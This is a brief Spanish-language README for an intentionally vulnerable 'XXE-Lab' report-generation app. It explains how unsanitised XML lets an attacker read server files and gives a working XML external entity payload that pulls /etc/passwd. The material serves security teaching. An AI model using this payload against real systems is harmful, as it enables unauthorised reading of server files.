## 🚨 XML External Entity Injection (XXE-Lab)
- Aplicación vulnerable a inyección de entidades externas dentro de un XML.
- Se trata de una aplicación de generación de reportes en la que los datos viajan en formato XML.

Sin embargo, al no estar correctamente sanitizada la petición, el atacante puede interceptar la petición y modificarla, logrando de esta forma leer archivos internos del servidor.

Con este payload podemos leer el archivo **/etc/passwd** de la máquina:

```sh
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <report>
                <name>&xxe;</name>
                <email>example@example.com</email>
                <description>Example description</description>
            </report>
```